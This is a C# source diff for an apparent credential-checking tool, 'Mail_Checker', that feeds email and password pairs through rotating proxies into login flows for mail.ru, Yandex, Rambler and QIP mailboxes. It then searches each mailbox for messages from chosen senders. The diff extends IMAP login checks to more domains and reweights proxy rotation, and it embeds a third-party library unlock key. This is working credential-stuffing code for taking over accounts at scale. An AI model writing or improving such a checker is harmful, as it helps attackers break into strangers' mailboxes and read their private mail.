@@ -4,6 +4,7 @@ using System.Threading;
 using System.Text.RegularExpressions;
 using xNet.Net;
 using System.Collections.Generic;
+using Chilkat;
 
 
 
@@ -47,7 +48,7 @@ namespace Mail_Checker
 
             for (int i = 0; i < proxys.Length; i++)
             {
-                this.proxys.Enqueue(new ProxyStats(proxys[i], 5));
+                this.proxys.Enqueue(new ProxyStats(proxys[i], 10));
             }
             
 
@@ -126,6 +127,8 @@ namespace Mail_Checker
 
                 if (serv == "imap.mail.ru") MailRuCheck(mailElements, proxyElements, out messages, out error);
                 else if (serv == "imap.yandex.ru") YandexCheck(mailElements, proxyElements, out messages, out error);
+                else if (serv == "imap.rambler.ru") ImapMailsCheck(mailElements, serv, proxyElements, out messages, out error);
+                else if (serv == "imap.qip.ru") ImapMailsCheck(mailElements, serv, proxyElements, out messages, out error);
                 else
                 {
                     proxys.Enqueue(proxyLine);
@@ -142,7 +145,7 @@ namespace Mail_Checker
                 else if (error == CheckErrors.noError)
                 {
                     valid++;
-                    proxyLine.stats+=5;
+                    proxyLine.stats+=10;
                     proxys.Enqueue(proxyLine);
                 }
                 else if (error == CheckErrors.mailError)
@@ -160,7 +163,7 @@ namespace Mail_Checker
 
 
                 MailInfo mInfo = new MailInfo(mailElements[0], mailElements[1], messages);
-                CheckState chState = new CheckState(mails.Count + workingThreads, proxys.Count + workingThreads, errors, valid, novalid, workingThreads);
+                CheckState chState = new CheckState(mails.Count + workingThreads-1, proxys.Count + workingThreads-1, errors, valid, novalid, workingThreads);
                 OneCheckDone(this, new CheckEventArgs(error, mInfo, chState));
 
 
@@ -181,7 +184,9 @@ namespace Mail_Checker
             else if (mail.Contains("@mail.ru") || mail.Contains("@list.ru")
             || mail.Contains("@inbox.ru") || mail.Contains("@bk.ru")) serv = "imap.mail.ru";
 
-            else if (mail.Contains("@rambler.ru")) serv = "imap.rambler.ru";
+            else if (mail.Contains("@rambler.ru") || mail.Contains("@lenta.ru") ||
+                mail.Contains("@autorambler.ru") || mail.Contains("@myrambler.ru") ||
+                mail.Contains("@ro.ru") || mail.Contains("@r0.ru")) serv = "imap.rambler.ru";
 
             else if (mail.Contains("@qip.ru") || mail.Contains("@pochta.ru") ||
                 mail.Contains("@fromru.com") || mail.Contains("@front.ru") ||
@@ -197,7 +202,7 @@ namespace Mail_Checker
                 mail.Contains("@photofile.ru") || mail.Contains("@fotoplenka.ru") ||
                 mail.Contains("@pochta.com")) serv = "imap.qip.ru";
 
-            else serv = "";
+            else serv = mail.Split(new char[] { '@' })[1];
             return serv;
         }
 
@@ -222,13 +227,13 @@ namespace Mail_Checker
                 HttpProxyClient proxy = new HttpProxyClient(proxyElements[0], Convert.ToInt32(proxyElements[1]));
                 CookieDictionary cookies = new CookieDictionary();
 
-                HttpRequest req1 = new HttpRequest();
+                xNet.Net.HttpRequest req1 = new xNet.Net.HttpRequest();
                 req1.Proxy = proxy;
                 req1.Cookies = cookies;
                 req1.ConnectTimeout = timeout*1000;
                 req1.UserAgent = "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10";
 
-                HttpResponse res1 = req1.Post("https://auth.mail.ru/cgi-bin/auth",
+                xNet.Net.HttpResponse res1 = req1.Post("https://auth.mail.ru/cgi-bin/auth",
                     "Login="+loginDomain[0]+"&Domain="+loginDomain[1]+"&Password="+mailElements[1]+"&saveauth=1&new_auth_form=1",
                     "application/x-www-form-urlencoded");
 
@@ -237,7 +242,7 @@ namespace Mail_Checker
 
                 if (res1str.Contains("&captcha=1") || res1str.Contains("Ваш ящик заблокирован"))
                 {
-                    error = CheckErrors.anotherError;
+                    error = CheckErrors.mailError;
                     return;
                 }
                 else if (res1str.Contains("&fail=1"))
@@ -251,7 +256,7 @@ namespace Mail_Checker
                     return;
                 }
 
-                HttpRequest req2 = new HttpRequest();
+                xNet.Net.HttpRequest req2 = new xNet.Net.HttpRequest();
                 req2.Proxy = proxy;
                 req2.Cookies = cookies;
                 req2.ConnectTimeout = timeout * 1000;
@@ -261,7 +266,7 @@ namespace Mail_Checker
                 for (int i = 0; i < querys.Length; i++)
                 {
 
-                    HttpResponse res2 = req2.Get("https://m.mail.ru/search/gosearch?q_from=" + querys[i]);
+                    xNet.Net.HttpResponse res2 = req2.Get("https://m.mail.ru/search/gosearch?q_from=" + querys[i]);
 
                     string res2str = res2.ToString();
 
@@ -325,15 +330,15 @@ namespace Mail_Checker
                 HttpProxyClient proxy = new HttpProxyClient(proxyElements[0], Convert.ToInt32(proxyElements[1]));
                 CookieDictionary cookies = new CookieDictionary();
 
-                HttpRequest req1 = new HttpRequest();
+                xNet.Net.HttpRequest req1 = new xNet.Net.HttpRequest();
                 req1.Proxy = proxy;
                 req1.Cookies = cookies;
                 req1.ConnectTimeout = timeout * 1000;
                 req1.AddParam("login", mailElements[0]);
                 req1.AddParam("passwd", mailElements[1]);
                 req1.AddParam("retpath", "https://mail.yandex.ru");
-                
-                HttpResponse res1 = req1.Post("https://passport.yandex.ru/passport?mode=auth&from=mail&origin=hostroot_new_l_enter&retpath=https://mail.yandex.ru");
+
+                xNet.Net.HttpResponse res1 = req1.Post("https://passport.yandex.ru/passport?mode=auth&from=mail&origin=hostroot_new_l_enter&retpath=https://mail.yandex.ru");
 
                 string res1str = res1.ToString();
 
@@ -358,7 +363,7 @@ namespace Mail_Checker
                 for (int i = 0; i < querys.Length; i++)
                 {
 
-                    HttpRequest req2 = new HttpRequest();
+                    xNet.Net.HttpRequest req2 = new xNet.Net.HttpRequest();
                     req2.Proxy = proxy;
                     req2.Cookies = cookies;
                     req2.ConnectTimeout = timeout * 1000;
@@ -371,7 +376,7 @@ namespace Mail_Checker
                     req2.AddParam("_locale", "ru");
                     req2.AddHeader("X-Requested-With", "XMLHttpRequest");
 
-                    HttpResponse res2 = req2.Post("https://mail.yandex.ru/neo2/handlers/handlers3.jsx?_h=messages");
+                    xNet.Net.HttpResponse res2 = req2.Post("https://mail.yandex.ru/neo2/handlers/handlers3.jsx?_h=messages");
 
                     string res2str = res2.ToString();
 
@@ -405,242 +410,92 @@ namespace Mail_Checker
 
         }
 
-        //private void ImapMailsCheck(string[] mailElements, string serv, string[] proxyElements, out int messNum, out CheckErrors error)
-        //{
-        //    bool success = true;
-        //    messNum = 0;
-        //    error = CheckErrors.noError;
 
+        private void ImapMailsCheck(string[] mailElements, string serv, string[] proxyElements, out int[] messages, out CheckErrors error)
+        {
+            bool success = true;
+            messages = new int[querys.Length];
+            for (int i = 0; i < messages.Length; i++)
+            {
+                messages[i] = 0;
+            }
 
+            error = CheckErrors.noError;
 
 
+            Imap imap = new Imap();
+            imap.ConnectTimeout = timeout;
+            imap.ReadTimeout = timeout;
+            imap.Ssl = true;
+            imap.Port = 993;
+            imap.UnlockComponent("1QCDO-156DU-TN61L-13B9N-HQO0G");
 
 
+            imap.HttpProxyHostname = proxyElements[0];
+            imap.HttpProxyPort = Convert.ToInt32(proxyElements[1]);
 
 
-        //    //Imap imap = new Imap();
-        //    //imap.ConnectTimeout = timeout;
-        //    //imap.ReadTimeout = timeout;
-        //    //imap.Ssl = true;
-        //    //imap.Port = 993;
-        //    //imap.UnlockComponent("1QCDO-156DU-TN61L-13B9N-HQO0G");
+            success = imap.Connect(serv);
 
 
-        //    //imap.HttpProxyHostname = proxyElements[0];
-        //    //imap.HttpProxyPort = Convert.ToInt32(proxyElements[1]);
 
+            if (success == true)
+            {
+                success = imap.Login(mailElements[0], mailElements[1]);
+            }
+            else if (error == CheckErrors.noError) error = CheckErrors.proxyError;
 
-        //    //success = imap.Connect(serv);
+            Mailboxes mboxes = null;
+            if (success == true)
+            {
+                mboxes = imap.ListMailboxes("", "");
+            }
+            else if (error == CheckErrors.noError && imap.LastResponse == "") error = CheckErrors.mailError;
+            else if (error == CheckErrors.noError) error = CheckErrors.mailError;
 
+            if (mboxes != null)
+            {
+                for (int i = 0; i < mboxes.Count; i++)
+                {
+                    string mboxName = mboxes.GetName(i);
+                    if (mboxName == "DraftBox" || mboxName == "SentBox" || mboxName == "Spam" || mboxName == "Draft" || mboxName == "Sent") continue;
+                    success = imap.SelectMailbox(mboxName);
+                    if (!success)
+                    {
+                        error = CheckErrors.proxyError;
+                        break;
+                    }
 
+                    for (int k = 0; k < querys.Length; k++)
+                    {
+                        MessageSet messageSet = imap.Search("FROM " + querys[k], false);
 
-        //    //if (success == true)
-        //    //{
-        //    //    success = imap.Login(mailElements[0], mailElements[1]);
-        //    //}
-        //    //else if (error == CheckErrors.noError) error = CheckErrors.proxyError;
+                        if (messageSet != null) messages[k] += messageSet.Count;
+                        else if (error == CheckErrors.noError)
+                        {
+                            messages[k] = 0;
+                            error = CheckErrors.proxyError;
+                            i += mboxes.Count;
+                            break;
+                        } 
+                    }
 
+                }
+            }
+            else if (error == CheckErrors.noError) error = CheckErrors.proxyError;
 
 
-        //    //if (success == true)
-        //    //{
-        //    //    success = imap.SelectMailbox("INBOX");
 
-        //    //}
-        //    //else if (error == CheckErrors.noError) error = CheckErrors.mailError;
 
+            imap.Disconnect();
+            imap.Dispose();
 
-        //    //MessageSet messageSet = null;
-        //    //if (success == true)
-        //    //{
-        //    //    messageSet = imap.Search("FROM ea.com", false);
-        //    //}
-        //    //else if (error == CheckErrors.noError) error = CheckErrors.connectError;
 
-        //    //if (messageSet != null) messNum += messageSet.Count;
-        //    //else if (error == CheckErrors.noError) error = CheckErrors.connectError;
 
-        //    ////if (success == true)
-        //    ////{
-        //    ////    success = imap.SelectMailbox("Удалённые");
-        //    ////}
-        //    ////else if (error == CheckErrors.noError) error = CheckErrors.connectError;
+        }
 
-        //    ////if (success == true)
-        //    ////{
-        //    ////    MessageSet messageSet = imap.Search(queryLong, true);
-        //    ////    if (messageSet != null) messNum += messageSet.Count;
-        //    ////}
-        //    ////else if (error == CheckErrors.noError) error = CheckErrors.connectError;
 
 
-        //    //imap.Disconnect();
-        //    //imap.Dispose();
-
-
-
-
-        //}
-
-
-
-
-        //private void YandexCheck(string[] mailElements, string[] proxyElements, out int messNum, out CheckErrors error)
-        //{
-
-
-        //    messNum = 0;
-        //    error = CheckErrors.noError;
-
-
-
-
-        //    try
-        //    {
-
-
-        //        HttpProxyClient proxy = new HttpProxyClient(proxyElements[0], Convert.ToInt32(proxyElements[1]));
-        //        CookieDictionary cookies = new CookieDictionary();
-
-        //        HttpRequest req1 = new HttpRequest();
-        //        req1.Proxy = proxy;
-        //        req1.Cookies = cookies;
-        //        req1.ConnectTimeout = timeout * 1000;
-
-        //        HttpResponse res1 = req1.Post("https://passport.yandex.ru/passport?mode=auth&retpath=https://mail.yandex.ru/lite/inbox",
-        //            "login=" + mailElements[0] + "&passwd=" + mailElements[1] + "&retpath=https://mail.yandex.ru/lite/inbox",
-        //            "application/x-www-form-urlencoded; charset=UTF-8");
-
-        //        string res1str = res1.ToString();
-
-        //        if (res1str.Contains("Неправильная пара логин-пароль"))
-        //        {
-        //            error = CheckErrors.mailError;
-        //            return;
-        //        }
-        //        else if (!res1str.Contains("Яндекс"))
-        //        {
-        //            error = CheckErrors.proxyError;
-        //            return;
-        //        }
-        //        else if (res1str.Contains("Ошибка проверки контрольных символов"))
-        //        {
-        //            error = CheckErrors.anotherError;
-        //            return;
-        //        }
-                
-
-
-        //        HttpRequest req2 = new HttpRequest();
-        //        req2.Proxy = proxy;
-        //        req2.Cookies = cookies;
-        //        req2.ConnectTimeout = timeout * 1000;
-        //        req2.UserAgent = "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10";
-        //        req2.AddHeader(HttpHeader.CacheControl, "max-age=0");
-        //        req2.AddHeader(HttpHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
-        //        req2.AddHeader(HttpHeader.AcceptLanguage, "ru,en-GB;q=0.8");
-        //        req2.AddHeader(HttpHeader.Referer, "https://passport.yandex.ru/passport?mode=auth&retpath=https%3A%2F%2Fmail.yandex.ru%2Flite%2Finbox");
-        //        req2.AddHeader("Host", "mail.yandex.ru");
-        //        req2.AddHeader("Referer", "https://mail.yandex.ru/lite/inbox?ncrnd=3629");
-
-        //        HttpResponse res2 = req2.Get("https://mail.yandex.ru/lite/search?request=" + query);
-
-
-        //        string res2str = res2.ToString();
-
-        //        messNum += Regex.Matches(res2str, "class=\"b-messages__message ").Count;
-
-        //    }
-        //    catch (HttpException)
-        //    {
-        //        error = CheckErrors.proxyError;
-        //    }
-        //    catch (ArgumentException)
-        //    {
-        //        error = CheckErrors.proxyError;
-        //    }
-
-
-
-
-
-
-
-
-
-
-
-        //    ////если пуст, то ошибка прокси
-        //    //if (resp == null)
-        //    //{
-        //    //    success = false;
-        //    //    error = CheckErrors.proxyError;
-        //    //}
-        //    ////если содержит фейл или блок, то ошибка почты
-        //    //else if (resp.BodyStr.Contains("error-msg") /*|| resp.BodyStr.Contains("почтовый ящик был взломан")*/)
-        //    //{
-        //    //    success = false;
-        //    //    error = CheckErrors.mailError;
-        //    //}
-        //    ////если не содержит, то ошибка прокси
-        //    //else if (!resp.BodyStr.Contains("yandex.ru\">Яндекс"))
-        //    //{
-        //    //    success = false;
-        //    //    error = CheckErrors.proxyError;
-        //    //}
-
-        //    ////поиск-запрос
-        //    //HttpResponse resp2 = null;
-        //    //if (success)
-        //    //{
-
-        //    //    HttpRequest req2 = new HttpRequest();
-        //    //    req2.AddHeader("_h", "messages");
-        //    //    req2.AddHeader("X-Requested-With", "XMLHttpRequest");
-        //    //    req2.AddHeader("Accept", "application/json, text/javascript, */*; q=0.01");
-        //    //    req2.AddHeader("Origin", "https://mail.yandex.ru");
-        //    //    req2.AddParam("_handlers", "messages");
-        //    //    req2.AddParam("search", "yes");
-        //    //    req2.AddParam("scope", "hdr_from");
-        //    //    req2.AddParam("request", "yandex");
-        //    //    req2.AddParam("_product", "RUS");
-        //    //    req2.AddParam("_locale", "ru");
-        //    //    req2.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
-        //    //    req2.Path = "/neo2/handlers/handlers3.jsx";
-        //    //    req2.HttpVerb = "POST";
-
-
-        //    //    resp2 = http.SynchronousRequest("mail.yandex.ru", 443, true, req2);
-
-        //    //}
-
-        //    ////если пустой или не содержит поиска, то ошибка соединения
-        //    //if (error == CheckErrors.noError && (resp2 == null /*|| !resp2.BodyStr.Contains("SearchPerson")*/))
-        //    //{
-        //    //    success = false;
-        //    //    error = CheckErrors.connectError;
-        //    //}
-
-
-        //    ////поиск сообщний
-        //    //if (success)
-        //    //{
-        //    //    MessageBox.Show(resp2.BodyStr);
-        //    //    MatchCollection foundCollection = Regex.Matches(resp2.BodyStr, "\"count\":.*");
-        //    //    if (foundCollection.Count > 0)
-        //    //    {
-        //    //        string found = foundCollection[0].Value.Replace("\"count\":", "");
-        //    //        messNum = Convert.ToInt32(found);
-        //    //    }
-        //    //    else messNum = 0;
-
-        //    //}
-
-
-        //    //http.CloseAllConnections();
-        //    //http.Dispose();
-
-        //}
 
 
     }
